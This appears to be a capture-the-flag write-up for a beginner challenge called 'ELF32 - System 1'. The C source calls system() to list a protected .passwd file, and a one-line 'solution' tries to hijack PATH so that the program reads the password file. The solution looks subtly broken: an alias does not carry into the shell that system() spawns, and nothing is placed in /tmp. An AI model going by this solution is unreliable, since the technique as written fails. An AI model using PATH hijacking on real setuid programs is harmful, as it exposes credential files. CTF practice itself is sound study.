## ELF32 - System 1

| Author | Level | Points |
| ------ | ----- | ------ |
| Lu33Y | Very Easy | 5 |


>Try to find your path padawan !
>
>Source code :
>
>```c
>#include <stdlib.h>
>#include <stdio.h>
> 
>/* gcc -m32 -o ch11 ch11.c */
> 
>int main(void) 
>{
>	system("ls /challenge/app-script/ch11/.passwd"); 
>	return 0;
>}
>```

#### Solution

```
alias ls="cat"; export PATH="/tmp"; ./ch11
```
